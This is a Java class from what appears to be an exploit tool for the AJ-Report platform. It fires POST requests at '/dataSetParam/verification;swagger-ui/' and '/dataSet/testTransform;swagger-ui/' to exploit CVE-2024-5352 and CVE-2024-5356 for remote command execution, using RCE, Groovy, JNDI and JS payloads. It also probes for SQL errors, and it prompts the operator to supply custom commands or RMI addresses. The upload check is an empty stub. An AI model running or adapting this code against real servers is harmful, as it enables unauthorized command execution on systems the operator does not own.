package com.liev.clouds.exp;

import com.liev.clouds.dao.AjReportDetectionParams;
import com.liev.clouds.payload.AjReportPayload;
import com.liev.clouds.utils.DataUtils;
import com.liev.clouds.dao.HttpResponse;
import com.liev.clouds.utils.HttpUtils;

import java.util.*;

public class AjReportExp {

    /**
     * 依次检测所有漏洞，会从高危到低危进行检测，检测到漏洞就返回
     * @param params
     */
    public void processDetection(AjReportDetectionParams params) {

        boolean rceExists = processRce(params);
        if (rceExists) {
            return;
        }
        boolean jsExpExists = processJsExp(params);
        if (jsExpExists) {
            return;
        }
        boolean sqlExists = processSql(params);
        if (sqlExists) {
            return;
        }
        boolean zipExists = processUploadZip(params);
        if (zipExists) {
            return;
        }

        params.getOutComeArea().appendText("未检测到漏洞！");
    }

    /**
     * CVE-2024-5352(任意命令执行)
     */
    public boolean processRce(AjReportDetectionParams params) {
        boolean exp = false;

        try {
            //特定请求头
            Map<String, String> headers = new HashMap<>();
            headers.put("Content-Type", "application/json;charset=UTF-8");

            String trueUrl = params.getUrl().endsWith("/") ? params.getUrl() + "dataSetParam/verification;swagger-ui/" : params.getUrl() + "/dataSetParam/verification;swagger-ui/";

            List<String> postDataList = params.getPostDataList();
            if (postDataList != null) {
                for (String postData : postDataList) {
                    HttpResponse response = HttpUtils.sendPost(trueUrl, postData, headers);
                    String formattedResponseBody = response.getResponseBody();

                    // Display response without regex checking
                    DataUtils.displayResponse(params.getPostTxt(), params.getResponseArea(), params.getOutComeArea(), postData, response, "请求发送成功");
                }
                return exp;
            }

            postDataList = Arrays.asList(AjReportPayload.RCE_EXP, AjReportPayload.GORRVY_EXP, AjReportPayload.JNDI_EXP);

            for (String postData : postDataList) {
                HttpResponse response = HttpUtils.sendPost(trueUrl, postData, headers);
                String formattedResponseBody = response.getResponseBody();
                int responseCode = response.getResponseCode();
                if (postData.equals(AjReportPayload.RCE_EXP)) {
                    if (!DataUtils.checkVulnerability(formattedResponseBody, "\"data\":\"(.*?)\"", "") && responseCode == 200) {
                        exp = true;
                        String result = "[+++]CVE-2024-5352任意命令执行漏洞存在!【√】 \n需要执行其它命令请勾选POST请求然后修改命令!";
                        DataUtils.displayResponse(params.getPostTxt(), params.getResponseArea(), params.getOutComeArea(), postData, response, result);
                        return exp;
                    }
                } else {
                    if (DataUtils.checkVulnerability(formattedResponseBody, "\"code\":\"(.*?)\"", "4005")) {
                        exp = true;
                        String result = "[+++]CVE-2024-5352任意命令执行漏洞存在!【√】 \n请勾选自定义POST请求然后在POST请求中自定义您的命令或RMI地址!";
                        DataUtils.displayResponse(params.getPostTxt(), params.getResponseArea(), params.getOutComeArea(), postData, response, result);
                        return exp;
                    }
                }
            }

            params.getOutComeArea().appendText("[---]CVE-2024-5352任意命令执行漏洞不存在!");

        } catch (Exception e) {
            params.getOutComeArea().setText("检测过程中出现错误: " + e.getMessage());
            e.printStackTrace();
        }

        return exp;
    }

    /**
     * CVE-2024-5356(任意命令执行)
     */
    public boolean processJsExp(AjReportDetectionParams params) {
        boolean exp = false;

        try {
            String trueUrl = params.getUrl().endsWith("/") ? params.getUrl() + "dataSet/testTransform;swagger-ui/" : params.getUrl() + "/dataSet/testTransform;swagger-ui/";

            Map<String, String> headers = new HashMap<>();
            headers.put("Content-Type", "application/json;charset=UTF-8");

            List<String> postDataList = params.getPostDataList();
            if (postDataList != null) {
                for (String postData : postDataList) {
                    HttpResponse response = HttpUtils.sendPost(trueUrl, postData, headers);
                    String formattedResponseBody = response.getResponseBody();

                    // Display response without regex checking
                    DataUtils.displayResponse(params.getPostTxt(), params.getResponseArea(), params.getOutComeArea(), postData, response, "请求发送成功");
                }
                return exp;
            }

            String postData = AjReportPayload.JS_EXP;

            HttpResponse response = HttpUtils.sendPost(trueUrl, postData, headers);
            String formattedResponseBody = response.getResponseBody();

            if (DataUtils.checkVulnerability(formattedResponseBody, "\"code\":\"(.*?)\"", "4005")) {
                exp = true;
                String result = "[+++]CVE-2024-5356任意命令执行漏洞存在!【√】 \n请勾选自定义POST请求然后在POST请求中自定义您的命令!";
                DataUtils.displayResponse(params.getPostTxt(), params.getResponseArea(), params.getOutComeArea(), postData, response, result);
                return exp;
            }

            params.getOutComeArea().appendText("[---]CVE-2024-5356任意命令执行漏洞漏洞不存在!");

        } catch (Exception e) {
            params.getOutComeArea().setText("检测过程中出现错误: " + e.getMessage());
            e.printStackTrace();
        }

        return exp;
    }

    // SQL Injection Detection
    public boolean processSql(AjReportDetectionParams params) {
        boolean exp = false;

        try {
            List<String> postDataList = params.getPostDataList();
            if (postDataList != null) {
                for (String postData : postDataList) {
                    Map<String, String> headers = new HashMap<>();
                    headers.put("Content-Type", "application/json;charset=UTF-8");

                    String trueUrl = params.getUrl().endsWith("/") ? params.getUrl() + "dataSet/testTransform;swagger-ui/" : params.getUrl() + "/dataSet/testTransform;swagger-ui/";
                    HttpResponse response = HttpUtils.sendPost(trueUrl, postData, headers);
                    String formattedResponseBody = response.getResponseBody();

                    // Display response without regex checking
                    DataUtils.displayResponse(params.getPostTxt(), params.getResponseArea(), params.getOutComeArea(), postData, response, "请求发送成功");
                }
                return exp;
            }

            postDataList = Arrays.asList(AjReportPayload.SQL_EXP);

            for (String postData : postDataList) {
                Map<String, String> headers = new HashMap<>();
                headers.put("Content-Type", "application/json;charset=UTF-8");

                String trueUrl = params.getUrl().endsWith("/") ? params.getUrl() + "dataSet/testTransform;swagger-ui/" : params.getUrl() + "/dataSet/testTransform;swagger-ui/";
                HttpResponse response = HttpUtils.sendPost(trueUrl, postData, headers);
                String formattedResponseBody = response.getResponseBody();

                // Assume the payload result processing here
                if (formattedResponseBody.contains("SQL error")) {
                    exp = true;
                    String result = "SQL 信息泄露漏洞存在!";
                    DataUtils.displayResponse(params.getPostTxt(), params.getResponseArea(), params.getOutComeArea(), postData, response, result);
                    return exp;
                }

                params.getOutComeArea().appendText("漏洞不存在!");

            }

        } catch (Exception e) {
            params.getOutComeArea().setText("检测过程中出现错误: " + e.getMessage());
            e.printStackTrace();
        }

        return exp;
    }

    // File Upload Vulnerability Detection
    public boolean processUploadZip(AjReportDetectionParams params) {
        boolean exp = false;

        // Implement the logic for zip file upload vulnerability check
        // Currently, it is not implemented

        return exp;
    }
}
